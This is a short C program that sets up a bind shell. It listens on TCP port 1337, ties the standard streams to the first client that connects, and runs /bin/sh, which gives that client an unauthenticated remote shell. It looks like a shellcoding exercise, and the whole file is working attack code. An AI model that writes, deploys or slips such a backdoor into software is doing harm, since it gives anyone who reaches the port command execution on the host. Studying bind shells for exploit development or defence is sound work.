#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int host_sockid;    // sockfd for host
int client_sockid;  // sockfd for client
	
struct sockaddr_in hostaddr;            // sockaddr struct 
char* args[] = {"/bin/sh", NULL};       // Args for execve

int main()
{
    // Create socket
	host_sockid = socket(PF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr struct to bind socket using it
	hostaddr.sin_family = AF_INET;
	hostaddr.sin_port = htons(1337);
	hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to IP/Port in sockaddr struct
	bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
	
    // Listen for incoming connections
	listen(host_sockid, 2);

    // Accept incoming connection, don't store data, just use the sockfd created
	client_sockid = accept(host_sockid, NULL, NULL);

    // Duplicate file descriptors for STDIN, STDOUT and STDERR
	dup2(client_sockid, 0);
	dup2(client_sockid, 1);
	dup2(client_sockid, 2);

    // Execute /bin/sh
	execve("/bin/sh", NULL, NULL);
	close(host_sockid);
	
	return 0;
}
